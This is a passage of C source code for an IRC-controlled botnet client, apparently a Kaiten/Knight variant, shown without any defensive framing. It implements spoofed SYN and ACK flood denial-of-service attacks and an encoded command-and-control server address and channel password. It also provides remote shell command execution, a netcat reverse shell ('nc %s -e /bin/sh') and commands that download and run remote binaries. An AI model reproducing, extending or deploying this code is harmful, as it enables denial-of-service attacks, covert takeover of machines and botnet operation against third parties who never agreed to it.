                if (atoi(argv[2]) == 0) dest=rand();
                send_tcp.ip.tot_len = htons(40+psize);
                send_tcp.ip.id = rand();
                send_tcp.ip.check = 0;
                send_tcp.ip.saddr = saddr;
                send_tcp.ip.daddr = daddr;
                send_tcp.tcp.source = rand();
                send_tcp.tcp.dest = dest;
                send_tcp.tcp.seq = rand();
                send_tcp.tcp.ack_seq = rand();
                send_tcp.tcp.check = 0;
                sin.sin_family = AF_INET;
                sin.sin_port = send_tcp.tcp.dest;
                sin.sin_addr.s_addr = send_tcp.ip.daddr;
                send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
                check = in_cksum((unsigned short *)&send_tcp, 40);
                pseudo_header.source_address = send_tcp.ip.saddr;
                pseudo_header.dest_address = send_tcp.ip.daddr;
                pseudo_header.placeholder = 0;
                pseudo_header.protocol = IPPROTO_TCP;
                pseudo_header.tcp_length = htons(20+psize);
                bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
                bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
                send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32+psize);
                sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));
                if (a >= 50) {
                        if (time(NULL) >= start+secs) exit(0);
                        a=0;
                }
                a++;
        }
        close(get);
        exit(0);


}




void ackflood(int sock, char *sender, int argc, char **argv) {
        struct send_tcp send_tcp;
        struct pseudo_header pseudo_header;
        struct sockaddr_in sin;
        unsigned int syn[20] = { 2,4,5,180,4,2,8,10,0,0,0,0,0,0,0,0,1,3,3,0 }, a=0;
        unsigned int psize=20, source, dest, check;
        unsigned long saddr, daddr,secs;
        int get;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
                Send(sock,"NOTICE %s :ACKFLOOD <target> <port> <secs>\n",sender);
                exit(1);
        }
        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        {int i; for(i=0;i<20;i++) send_tcp.buf[i]=(u_char)syn[i];}

        daddr=host2ip(sender,argv[1]);
        secs=atol(argv[3]);
	dest=htons(atoi(argv[2]));

        Send(sock,"NOTICE %s :Flooding with TCP ACK %s.\n",sender,argv[1]);

	send_tcp.ip.ihl = 5;
        send_tcp.ip.version = 4;
        send_tcp.ip.tos = 16;
        send_tcp.ip.frag_off = 64;
	send_tcp.ip.ttl = 255;
	send_tcp.ip.protocol = 6;
	send_tcp.tcp.doff = 5;
        send_tcp.tcp.res1 = 0;
        send_tcp.tcp.cwr = 0;
        send_tcp.tcp.ece = 0;
        send_tcp.tcp.urg = 0;
        send_tcp.tcp.ack = 1;
        send_tcp.tcp.psh = 1;
	send_tcp.tcp.rst = 0;
        send_tcp.tcp.fin = 0;
        send_tcp.tcp.syn = 0;
	send_tcp.tcp.window = 30845;
        send_tcp.tcp.urg_ptr = 0;


        while(1) {
		saddr=getspoof();
		if (atoi(argv[2]) == 0) dest=rand();
                send_tcp.ip.tot_len = htons(40+psize);
                send_tcp.ip.id = rand();
                send_tcp.ip.check = 0;
                send_tcp.ip.saddr = saddr;
                send_tcp.ip.daddr = daddr;
                send_tcp.tcp.source = rand();
                send_tcp.tcp.dest = dest;
                send_tcp.tcp.seq = rand();
                send_tcp.tcp.ack_seq = rand();
                send_tcp.tcp.check = 0;
                sin.sin_family = AF_INET;
                sin.sin_port = send_tcp.tcp.dest;
                sin.sin_addr.s_addr = send_tcp.ip.daddr;
                send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
                check = in_cksum((unsigned short *)&send_tcp, 40);
                pseudo_header.source_address = send_tcp.ip.saddr;
                pseudo_header.dest_address = send_tcp.ip.daddr;
                pseudo_header.placeholder = 0;
                pseudo_header.protocol = IPPROTO_TCP;
                pseudo_header.tcp_length = htons(20+psize);
                bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
                bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
                send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32+psize);
                sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));


                if (a >= 50) {
                        if (time(NULL) >= start+secs) exit(0);
                        a=0;
                }
                a++;
        }
        close(get);
        exit(0);


}

void nsackflood(int sock, char *sender, int argc, char **argv) {
        struct send_tcp send_tcp;
        struct pseudo_header pseudo_header;
        struct sockaddr_in sin;
        unsigned int syn[20] = { 2,4,5,180,4,2,8,10,0,0,0,0,0,0,0,0,1,3,3,0 }, a=0;
        unsigned int psize=20, source, dest, check;
        unsigned long saddr, daddr,secs;
        int get;
        time_t start=time(NULL);
        if (mfork(sender) != 0) return;
        if (argc < 3) {
                Send(sock,"NOTICE %s :NSACKFLOOD <target> <port> <secs>\n",sender);
                exit(1);
        }
        if ((get = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) exit(1);
        {int i; for(i=0;i<20;i++) send_tcp.buf[i]=(u_char)syn[i];}

        daddr=host2ip(sender,argv[1]);
        secs=atol(argv[3]);
        dest=htons(atoi(argv[2]));

        Send(sock,"NOTICE %s :Flooding with TCP ACK %s.\n",sender,argv[1]);

        send_tcp.ip.ihl = 5;
        send_tcp.ip.version = 4;
        send_tcp.ip.tos = 16;
        send_tcp.ip.frag_off = 64;
        send_tcp.ip.ttl = 255;
        send_tcp.ip.protocol = 6;
        send_tcp.tcp.doff = 5;
        send_tcp.tcp.res1 = 0;
        send_tcp.tcp.cwr = 0;
        send_tcp.tcp.ece = 0;
        send_tcp.tcp.urg = 0;
        send_tcp.tcp.ack = 1;
        send_tcp.tcp.psh = 1;
        send_tcp.tcp.rst = 0;
        send_tcp.tcp.fin = 0;
        send_tcp.tcp.syn = 0;
        send_tcp.tcp.window = 30845;
        send_tcp.tcp.urg_ptr = 0;


        while(1) {
                saddr=getspoof();
                if (atoi(argv[2]) == 0) dest=rand();
                send_tcp.ip.tot_len = htons(40+psize);
                send_tcp.ip.id = rand();
                send_tcp.ip.check = 0;
                send_tcp.ip.saddr = saddr;
                send_tcp.ip.daddr = daddr;
                send_tcp.tcp.source = rand();
                send_tcp.tcp.dest = dest;
                send_tcp.tcp.seq = rand();
                send_tcp.tcp.ack_seq = rand();
                send_tcp.tcp.check = 0;
                sin.sin_family = AF_INET;
                sin.sin_port = send_tcp.tcp.dest;
                sin.sin_addr.s_addr = send_tcp.ip.daddr;
                send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);
                check = in_cksum((unsigned short *)&send_tcp, 40);
                pseudo_header.source_address = send_tcp.ip.saddr;
                pseudo_header.dest_address = send_tcp.ip.daddr;
                pseudo_header.placeholder = 0;
                pseudo_header.protocol = IPPROTO_TCP;
                pseudo_header.tcp_length = htons(20+psize);
                bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
                bcopy((char *)&send_tcp.buf, (char *)&pseudo_header.buf, psize);
                send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32+psize);
                sendto(get, &send_tcp, 40+psize, 0, (struct sockaddr *)&sin, sizeof(sin));


                if (a >= 50) {
                        if (time(NULL) >= start+secs) exit(0);
                        a=0;
                }
                a++;
        }
        close(get);
        exit(0);


}

// Shamelessly ripped from the Knight varient (and improved)
void update(int sock, char *sender, int argc, char **argv) {
	int sock2,i,d;
	struct sockaddr_in server;
	unsigned long ipaddr;
	unsigned char dgcc;
	char buf[1024], *file;
	FILE *gcc;
	int parent=getpid();
	if (mfork(sender) != 0) return;
	if (argc < 2) {
		Send(sock,"NOTICE %s :UPDATEHTTP <host> <src:bin>\n",sender);
		exit(0);
	}
	if ((sock2 = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		Send(sock,"NOTICE %s :Unable to create socket (Wierd, you shouldnt get this error and ITS NOT MY FAULT!).\n",sender);
		exit(0);
	}
	server.sin_family = AF_INET;
	server.sin_port = htons(80);
	if ((ipaddr = inet_addr(argv[1])) == -1) {
		struct hostent *hostm;
		if ((hostm=gethostbyname(argv[1])) == NULL) {
			Send(sock,"NOTICE %s :Unable to resolve address.\n",sender);
			exit(0);
		}
		memcpy((char*)&server.sin_addr, hostm->h_addr, hostm->h_length);
	}
	else server.sin_addr.s_addr = ipaddr;
	memset(&(server.sin_zero), 0, 8);
	if (connect(sock2,(struct sockaddr *)&server, sizeof(server)) != 0) {
		Send(sock,"NOTICE %s :Unable to connect to http.\n",sender);
		exit(0);
	}

	gcc=popen("gcc --help","r");
	if (gcc != NULL) {
		memset(buf,0,1024);
		fgets(buf,1024,gcc);
		if (!strstr(buf,"Usage")) dgcc=0;
		else dgcc=1;
		pclose(gcc);
	} else dgcc=0;

	for (i=0;i<strlen(argv[2]) && argv[2][i] != ':';i++);
	argv[2][i]=0;
	if (dgcc) file=argv[2];
	else file=argv[2]+i+1;

	Send(sock2,"GET /%s HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)\r\nHost: %s:80\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */\x2a\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n",file,argv[1]);
	Send(sock,"NOTICE %s :Receiving update.\n",sender);
	system("mkdir /tmp");
	if (dgcc) {
		FILE *file=fopen("/tmp/.c","wb");
		char bufm[4096];
		while(1) {
			int i;
			if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
			if (i < 4096) bufm[i]=0;
			for (d=0;d<i;d++) if (!strncmp(bufm+d,"\r\n\r\n",4)) {
				for (d+=4;d<i;d++) fputc(bufm[d],file);
				goto done;
			}
		}
		done:
		while(1) {
			int i;
			if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
			if (i < 4096) bufm[i]=0;
			for (d=0;d<i;d++) fputc(bufm[d],file);
		}
		fclose(file);
		memset(buf,0,4096);
		sprintf(buf,"(gcc -o %s /tmp/.c; rm -rf /tmp/.c; ;sh -c \"trap '' 1;(kill -9 %d; %s &)&)\"& > /dev/null 2>&1",execfile,parent,execfile);
	}
	else {
		FILE *file=fopen("/tmp/.o","wb");
		unsigned char bufm[4096];
		while(1) {
			int i;
			if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
			if (i < 4096) bufm[i]=0;
			for (d=0;d<i;d++) if (!strncmp(bufm+d,"\r\n\r\n",4)) {
				for (d+=4;d<i;d++) fputc(bufm[d],file);
				goto done2;
			}
		}
		done2:
		while(1) {
			int i,d;
			if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
			if (i < 4096) bufm[i]=0;
			for (d=0;d<i;d++) fputc(bufm[d],file);
		}
		fclose(file);
		memset(buf,0,4096);
		sprintf(buf,"trap "" 1;(cat /tmp/.o > %s; chmod 755 %s; trap '' 1;((killall -9 %s || kill -9 %d);kill -9 %d ;./%s &)) 2> /dev/null",execfile,execfile,argv[0],actualparent,parent,execfile);

	}
	close(sock);
	close(sock2);
	system(buf);
	kill(9,0);
	exit(0);
}


void move(int sock, char *sender, int argc, char **argv) {
	if (disabled == 1) {
		Send(sock,"NOTICE %s :Unable to comply.\n",sender);
		return;
	}
        if (argc < 1) {
                Send(sock,"NOTICE %s :MOVE <server>\n",sender);
                exit(1);
        }
	server=strdup(argv[1]);
	changeservers=1;
	close(sock);
}
/*
* Kaiten now has it's own package manger! Shellz proudly presents HackPkg!
*          ... a very hacky package manger indeed!
*/
void hackpkg(int sock, char *sender, int argc, char **argv) {
	if (disabled == 1) {
		Send(sock,"NOTICE %s :Unable to comply.\n",sender);
		return;
	}
        int sock2,i,d;
        struct sockaddr_in server;
        unsigned long ipaddr;
        char buf[1024];
        FILE *file;
        unsigned char bufm[4096];
        if (mfork(sender) != 0) return;
        if (argc < 2) {
                Send(sock,"NOTICE %s :HACKPGK <url> <binary name>\n",sender);
                exit(0);
        }
        if ((sock2 = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
                Send(sock,"NOTICE %s :Unable to create socket.\n",sender);
                exit(0);
        }
	mkdir("/var/bin", 0775);
        if (!strncmp(argv[1],"http://",7)) strcpy(buf,argv[1]+7);
        else strcpy(buf,argv[1]);
        for (i=0;i<strlen(buf) && buf[i] != '/';i++);
        buf[i]=0;
        server.sin_family = AF_INET;
        server.sin_port = htons(80);
        if ((ipaddr = inet_addr(buf)) == -1) {
                struct hostent *hostm;
                if ((hostm=gethostbyname(buf)) == NULL) {
                        Send(sock,"NOTICE %s :Unable to resolve address.\n",sender);
                        exit(0);
                }
                memcpy((char*)&server.sin_addr, hostm->h_addr, hostm->h_length);
        }
        else server.sin_addr.s_addr = ipaddr;
        memset(&(server.sin_zero), 0, 8);
        if (connect(sock2,(struct sockaddr *)&server, sizeof(server)) != 0) {
                Send(sock,"NOTICE %s :Unable to connect to http.\n",sender);
                exit(0);
        }
	mkdir("/var/bin", 0775);
        Send(sock2,"GET /%s HTTP/1.0\r\nConnection: Keep-Alive\r\nUser-Agent: Mozilla/1.67 [en] (X11; U; Linux 2.2.16-3 x86)\r\nHost: %s:80\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */\x2a\r\nAccept-Encoding: gzip\r\nAccept-Language: en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n",buf+i+1,buf);
        Send(sock,"NOTICE %s :Receiving file.\n",sender);
        file=fopen(argv[2],"wb");
        while(1) {
                int i;
                if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
                if (i < 4096) bufm[i]=0;
                for (d=0;d<i;d++) if (!strncmp(bufm+d,"\r\n\r\n",4)) {
                        for (d+=4;d<i;d++) fputc(bufm[d],file);
                        goto done;
                }
        }
        done:
        Send(sock,"NOTICE %s :Installed %s to /var/bin/%s.\n",sender,argv[2],argv[2]);
        while(1) {
                int i,d;
                if ((i=recv(sock2,bufm,4096,0)) <= 0) break;
                if (i < 4096) bufm[i]=0;
                for (d=0;d<i;d++) fputc(bufm[d],file);
        }
        fclose(file);
        close(sock2);
	char MoveIt[255];
	sprintf(MoveIt, "cat %s > /var/bin/%s",argv[2],argv[2]);
	system(MoveIt);
	char DeleteIt[255];
	sprintf(DeleteIt, "rm %s",argv[2]);
	system(DeleteIt);
	char perms[255];
	sprintf(perms, "chmod 775 /var/bin/%s",argv[2]);
	system(perms);
        exit(0);
}

void help(int sock, char *sender, int argc, char **argv) {
        if (mfork(sender) != 0) return;
	Send(sock,"NOTICE %s :ZIGGY StarTux %s = ShellzrUs 2016 - Commands must take a parameter. \n",sender, botversion); sleep(1);
	Send(sock,"NOTICE %s :=============== DDOS ATTACKS & Functions ======= =  \n",sender); sleep(1);
        Send(sock,"NOTICE %s :PAN <target> <port> <secs>                       = An advanced syn flooder that will kill most network drivers\n",sender); sleep(1);
        Send(sock,"NOTICE %s :UDP <target> <port> <secs>                       = A udp flooder\n",sender); sleep(1);
        Send(sock,"NOTICE %s :UNKNOWN <target> <secs>                          = The best non-spoof udp flooder\n",sender); sleep(1);
	Send(sock,"NOTICE %s :RANDOMFLOOD <target> <port> <secs>               = Syn/Ack Flooder. \n",sender); sleep(1);
	Send(sock,"NOTICE %s :NSACKFLOOD <target> <port> <secs>                = New Generation Ack Flooder!\n",sender); sleep(1);
	Send(sock,"NOTICE %s :NSSYNFLOOD <target> <port> <secs>                = New Generation Syn Fooder! \n",sender); sleep(1);
	Send(sock,"NOTICE %s :SYNFLOOD <target> <port> <secs>                  = A classic synflooder. \n",sender); sleep(1);
	Send(sock,"NOTICE %s :ACKFLOOD <target> <port> <secs>                  = A classic ackflooder. \n",sender); sleep(1);
        Send(sock,"NOTICE %s :GETSPOOFS                                        = Gets the current spoofing\n",sender); sleep(1);
        Send(sock,"NOTICE %s :SPOOFS <subnet>                                  = Changes spoofing to a subnet\n",sender); sleep(1);
        Send(sock,"NOTICE %s :KILLALL                                          = Kills all current packeting\n",sender); sleep(1);
	Send(sock,"NOTICE %s :=============== Bot/IRC Functions ============== =  \n",sender); sleep(1);
        Send(sock,"NOTICE %s :NICK <nick>                                      = Changes the nick of the client\n",sender); sleep(1);
	Send(sock,"NOTICE %s :SERVER <server>                                  = Changes servers\n",sender); sleep(1);
	Send(sock,"NOTICE %s :IRC <command>                                    = Sends this command to the server\n",sender); sleep(1);
        Send(sock,"NOTICE %s :DISABLE                                          = Disables all packeting from this client\n",sender); sleep(1);
        Send(sock,"NOTICE %s :ENABLE                                           = Enables all packeting from this client\n",sender); sleep(1);
        Send(sock,"NOTICE %s :KILL                                             = Kills the client\n",sender); sleep(1);
	Send(sock,"NOTICE %s :VERSION                                          = Requests version of client\n",sender); sleep(1);
        Send(sock,"NOTICE %s :HELP                                             = Displays this\n",sender); sleep(1);
	Send(sock,"NOTICE %s :GET <http address> <save as>                     = Downloads a file off the web and saves it onto the hd\n",sender); sleep(1);
	Send(sock,"NOTICE %s :UPDATE <http address> <src:bin>                  = Update this bot\n",sender); sleep(1);
	Send(sock,"NOTICE %s :HACKPKG <http address> <bin name>                = HackPkg is here! Install a bin, using http, no depends!\n",sender); sleep(1);
        Send(sock,"NOTICE %s :======== Unix Shell & Command Functions ======== =  \n",sender); sleep(1);
	Send(sock,"NOTICE %s :SH <command>                                     = Executes a command\n",sender); sleep(1);
	Send(sock,"NOTICE %s :ISH <command>                                    = SH, interactive, sends to channel\n",sender); sleep(1);
	Send(sock,"NOTICE %s :SHD <command>                                    = Executes a daemonized command\n",sender); sleep(1);
	Send(sock,"NOTICE %s :BASH <cmd>                                       = Execute commands using bash (if present). \n",sender); sleep(1);
	Send(sock,"NOTICE %s :SYSINFO                                          = Print env,users, useful programs, uptime, etc. \n",sender); sleep(1);
	Send(sock,"NOTICE %s :RSHELL <server> <port>                           = Equates to nohup nc ip port -e /bin/sh\n",sender); sleep(1);
	exit(0);
}
void killall(int sock, char *sender, int argc, char **argv) {
	if (disabled == 1) {
		Send(sock,"NOTICE %s :Unable to comply.\n",sender);
		return;
	}
        unsigned long i;
        for (i=0;i<numpids;i++) {
                if (pids[i] != 0 && pids[i] != getpid()) {
                        if (sender) Send(sock,"NOTICE %s :Killing pid %d.\n",sender,pids[i]);
                        kill(pids[i],9);
                }
        }
}

void killd(int sock, char *sender, int argc, char **argv) {
	char buf[1024]={0};
	if (disabled == 1) return;
	sprintf(buf,"kill -9 %d;kill -9 0",actualparent);
	system(buf);
	exit(0);

}
struct FMessages { char *cmd; void (* func)(int,char *,int,char **); } flooders[] = {
        { "PAN", pan },
        { "UDP", udp },
	{ "UNKNOWN", unknown },
	{ "RANDOMFLOOD", randomflood},
	{ "NSACKFLOOD", nsackflood },
	{ "NSSYNFLOOD", nssynflood },
	{ "ACKFLOOD", ackflood },
	{ "SYNFLOOD", synflood },
        { "NICK", nickc },
        { "KEKSERVER", move },
	{ "GETSPOOFS", getspoofs },
        { "SPOOFS", spoof },
	{ "HACKPKG", hackpkg },
	{ "DISABLE", disable },
        { "ENABLE", enable },
        { "UPDATE", update },
        { "FUCKIT", killd },
	{ "GET", get },
        { "VERSION", version },
        { "KILLALL", killall },
        { "HELP", help },
{ (char *)0, (void (*)(int,char *,int,char **))0 } };
void _PRIVMSG(int sock, char *sender, char *str) {
/////////////////////////////////////////////////////////////////////////////////////////////
// Defines where to download binaries from. Set enchttpserver above. Assumes it's also http srvr
decode(enchttpserver, 0);
//char *httpserver[256];
char *httpserver = decodedsrv;
//decode(enchttpserver, 0);
//char *httpserver = decodedsrv;
//char s_copy[64]
//strncpy(s_copy, decodedsrv, sizeof(s_copy));

sprintf(httpserver,"http://%s", decodedsrv);  // Url to wherever you keep your binaries
// Ensure we have this directory, as it seems to often get deleted...
mkdir("/var/bin", 0775);

        int i;
        char *to, *message;
        for (i=0;i<strlen(str) && str[i] != ' ';i++);
        str[i]=0;
        to=str;
        message=str+i+2;
        for (i=0;i<strlen(sender) && sender[i] != '!';i++);
        sender[i]=0;
        if (*message == '!' && !strcasecmp(to,chan)) {
                char *params[12], name[1024]={0};
                int num_params=0, m;
                message++;
                for (i=0;i<strlen(message) && message[i] != ' ';i++);
                message[i]=0;
                if (strwildmatch(message,nick)) return;
                message+=i+1;

                if (!strncmp(message,"IRC ",4)) if (disabled) Send(sock,"NOTICE %s :Unable to comply.\n",sender); else Send(sock,"%s\n",message+4);
                if (!strncmp(message,"SH ",3)) {
                        char buf[1024];
                        FILE *command;
                        if (mfork(sender) != 0) return;
                        memset(buf,0,1024);
                        sprintf(buf,"export PATH=$PATH:/var/bin;(%s)2>/dev/null",message+3);
                        command=popen(buf,"r");
                        while(!feof(command)) {
                                memset(buf,0,1024);
                                fgets(buf,1024,command);
                                Send(sock,"NOTICE %s :%s\n",sender,buf);
				//Send(sock,"NOTICE %s :%s\n",CHAN,buf);
                                sleep(1);
                        }
                        pclose(command);
                        exit(0);
                }


		// SHD (daemonize sh command)
		if (!strncmp(message,"SHD ",4)) {
			char buf[1024];
			FILE *command;
			if (mfork(sender) != 0) return;
			memset(buf,0,1024);
			sprintf(buf,"export HOME=/;export PATH=$PATH:/var/bin;trap '' 1;((%s) 1>&- 2>&-  > /dev/null 2>&1) &",message,message+4);
			command=popen(buf,"r");
			while(!feof(command)) {
				memset(buf,0,1024);
				fgets(buf,1024,command);
                                Send(sock,"NOTICE %s :%s\n",sender,buf);
				sleep(1);
			}
			pclose(command);
			exit(0);
		}

//"Interactive" SH command (Sends to channel instead of status)
		if (!strncmp(message,"ISH ",3)) {
                        char buf[1024];
                        FILE *command;
                        if (mfork(sender) != 0) return;
                        memset(buf,0,1024);
                        sprintf(buf,"export HOME=/tmp;export PATH=$PATH:/var/bin;(%s)2>/dev/null",message+3);
                        command=popen(buf,"r");
                        while(!feof(command)) {
                                memset(buf,0,1024);
                                fgets(buf,1024,command);
                                //Send(sock,"NOTICE %s :%s\n",sender,buf);
                                  Send(sock,"PRIVMSG %s :%s\n",CHAN,buf);
                                sleep(1);
                        }
                        pclose(command);
                        exit(0);
	}


// !* RSHELL server.com 4444 (reverse shell via nc.)
		if (!strncmp(message,"RSHELL ",6)) {
                        char buf[1024];
                        FILE *command;
                        if (mfork(sender) != 0) return;
                        memset(buf,0,1024);
                        sprintf(buf,"export HOME=/tmp;export PATH=$PATH:/var/bin;trap '' 1 2; sh -c 'nc %s -e /bin/sh ' 2>/dev/null &",message+6);
                        command=popen(buf,"r");
                        while(!feof(command)) {
                                memset(buf,0,1024);
                                fgets(buf,1024,command);
                                Send(sock,"NOTICE %s :%s\n",sender,buf);
                                sleep(1);
                        }
                        pclose(command);
                        exit(0);
                }

if (!strncmp(message,"SYSINFO ",7)) {
                        char buf[1024];
                        FILE *command;
                        if (mfork(sender) != 0) return;
                        memset(buf,0,1024);
                        sprintf(buf,"export PATH=$PATH:/var/bin;(cat /proc/cpuinfo;cat /proc/version;cat /proc/meminfo;id;uptime||cat /proc/uptime;cat /etc/hostname;netstat -tauenv)2>/dev/null",message+3);
                        command=popen(buf,"r");
                        while(!feof(command)) {
                                memset(buf,0,1024);
                                fgets(buf,1024,command);
                                Send(sock,"NOTICE %s :%s\n",sender,buf);
                                //Send(sock,"PRIVMSG %s :%s\n",CHAN,buf);
                                sleep(1);
                        }
                        pclose(command);
                        exit(0);
	}


// BASH <cmd>

		if (!strncmp(message,"BASH ",5)) {
                        char buf[1024];
                        FILE *command;
                        if (mfork(sender) != 0) return;
                        memset(buf,0,1024);
                        sprintf(buf,"export HOME=/tmp;export SHELL=/bin/bash;export PATH=$PATH:/var/bin;(%s) 2>/dev/null",message+5);
                        command=popen(buf,"r");
                        while(!feof(command)) {
                                memset(buf,0,1024);
                                fgets(buf,1024,command);
                                Send(sock,"NOTICE %s :%s\n",sender,buf);
                                sleep(1);
                        }
                        pclose(command);
                        exit(0);

		}



                m=strlen(message);
                for (i=0;i<m;i++) {
                        if (*message == ' ' || *message == 0) break;
                        name[i]=*message;
                        message++;
                }
                for (i=0;i<strlen(message);i++) if (message[i] == ' ') num_params++;
                num_params++;
                if (num_params > 10) num_params=10;
                params[0]=name;
                params[num_params+1]="\0";
                m=1;
                while (*message != 0) {
                        message++;
                        if (m >= num_params) break;
                        for (i=0;i<strlen(message) && message[i] != ' ';i++);
                        params[m]=(char*)malloc(i+1);
                        strncpy(params[m],message,i);
                        params[m][i]=0;
                        m++;
                        message+=i;
                }
                for (m=0; flooders[m].cmd != (char *)0; m++) {
                        if (!strcasecmp(flooders[m].cmd,name)) {
                                flooders[m].func(sock,sender,num_params-1,params);
                                for (i=1;i<num_params;i++) free(params[i]);
                                return;
                        }
                }
        }
}
//////////////////////////////////////////////////////////
void decode(char *str, int dtype)
{
	char decoded[512];
	int x = 0, i = 0, c;
/*
 * Change the position of your encodes (and in hide.c!) for a private cipher
*/
char encodes[] = { 
	'x', 'm', '@', '_', ';', 'w', ',', 'B', '-', 'Z', '*', 'j', '?', 'n', 'v', 'E', 
	'|', 's', 'q', '1', 'o', '$', '3', '"', '7', 'z', 'K', 'C', '<', 'F', ')', 'u', 
	't', 'A', 'r', '.', 'p', '%', '=', '>', '4', 'i', 'h', 'g', 'f', 'e', '6', 'c', 
	'b', 'a', '~', '&', '5', 'D', 'k', '2', 'd', '!', '8', '+', '9', 'U', 'y', ':'
	
};
char decodes[] = { 
	'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 
	'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 
	'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L',
	'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '.', ' '
};
	memset(decoded, 0, sizeof(decoded));
	while (x < strlen(str))
	{
		for (c = 0; c <= sizeof(encodes); c++)
		{
			if(str[x] == encodes[c])
			{
				if (!dtype)
					decodedsrv[i] = decodes[c];
				else 
					decodedpsw[i] = decodes[c];
				i++;
			}
		}
		x++;
	}

	return;
}

/*
 Decode the encrypted channel password 
*/
void _376(int sock, char *sender, char *str) {
	Send(sock,"MODE %s +xiw\n",nick);
	if (encirc != 0)
		{
			decode(enc_passwd, 1);
			Send(sock,"JOIN %s :%s\n",chan,decodedpsw);
		}
	else
		{
			Send(sock,"JOIN %s :%s\n",chan,key);
		}
        Send(sock,"WHO %s\n",nick);
}

void _PING(int sock, char *sender, char *str) {
        Send(sock,"PONG %s\n",str);
}
void _352(int sock, char *sender, char *str) {
        int i,d;
        char *msg=str;
        struct hostent *hostm;
        unsigned long m;
        for (i=0,d=0;d<5;d++) {
                for (;i<strlen(str) && *msg != ' ';msg++,i++); msg++;
                if (i == strlen(str)) return;
        }
        for (i=0;i<strlen(msg) && msg[i] != ' ';i++);
        msg[i]=0;
        if (!strcasecmp(msg,nick) && !spoofsm) {
                msg=str;
                for (i=0,d=0;d<3;d++) {
                        for (;i<strlen(str) && *msg != ' ';msg++,i++); msg++;
                        if (i == strlen(str)) return;
                }
                for (i=0;i<strlen(msg) && msg[i] != ' ';i++);
                msg[i]=0;
                if ((m = inet_addr(msg)) == -1) {
                        if ((hostm=gethostbyname(msg)) == NULL) {
                                Send(sock,"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\n",chan);
                                return;
                        }
                        memcpy((char*)&m, hostm->h_addr, hostm->h_length);
                }
                ((char*)&spoofs)[3]=((char*)&m)[0];
                ((char*)&spoofs)[2]=((char*)&m)[1];
                ((char*)&spoofs)[1]=((char*)&m)[2];
                ((char*)&spoofs)[0]=0;
                spoofsm=256;
        }
}
void _433(int sock, char *sender, char *str) {
        free(nick);
        nick=makestring();
}
void _NICK(int sock, char *sender, char *str) {
	int i;
        for (i=0;i<strlen(sender) && sender[i] != '!';i++);
        sender[i]=0;
	if (!strcasecmp(sender,nick)) {
		if (*str == ':') str++;
		if (nick) free(nick);
		nick=strdup(str);
	}
}
struct Messages { char *cmd; void (* func)(int,char *,char *); } msgs[] = {
        { "352", _352 },
        { "376", _376 },
        { "433", _433 },
        { "422", _376 },
        { "PRIVMSG", _PRIVMSG },
        { "PING", _PING },
	{ "NICK", _NICK },
{ (char *)0, (void (*)(int,char *,char *))0 } };
void con() {
        struct sockaddr_in srv;
        unsigned long ipaddr,start;
        int flag;
        struct hostent *hp;
start:
	sock=-1;
	flag=1;
	srand((time(NULL) ^ getpid()) + getppid());
	if (changeservers == 0) server=servers[rand()%numservers];
	if (encirc != 0) decode(server, 0);char *server = decodedsrv;
	changeservers=0;
        while ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0);
	if (inet_addr(server) == 0 || inet_addr(server) == -1) {
		if ((hp = gethostbyname(server)) == NULL) {
			server=NULL;
			close(sock);
			goto start;
		}
		bcopy((char*)hp->h_addr, (char*)&srv.sin_addr, hp->h_length);
	}
	else srv.sin_addr.s_addr=inet_addr(server);
        srv.sin_family = AF_INET;
        srv.sin_port = htons(PORT);
	ioctl(sock,FIONBIO,&flag);
	start=time(NULL);
	while(time(NULL)-start < 10) {
		errno=0;
		if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) == 0 || errno == EISCONN) {
		        setsockopt(sock,SOL_SOCKET,SO_LINGER,0,0);
		        setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,0,0);
		        setsockopt(sock,SOL_SOCKET,SO_KEEPALIVE,0,0);
			return;
		}
		if (!(errno == EINPROGRESS ||errno == EALREADY)) break;
		sleep(1);
	}
	server=NULL;
	close(sock);
	goto start;
}

/*
* Set custom commands to run when the bot executes here.
*/

int execStuff(void) {
	FILE * proc;
	char command[512];
	int len;
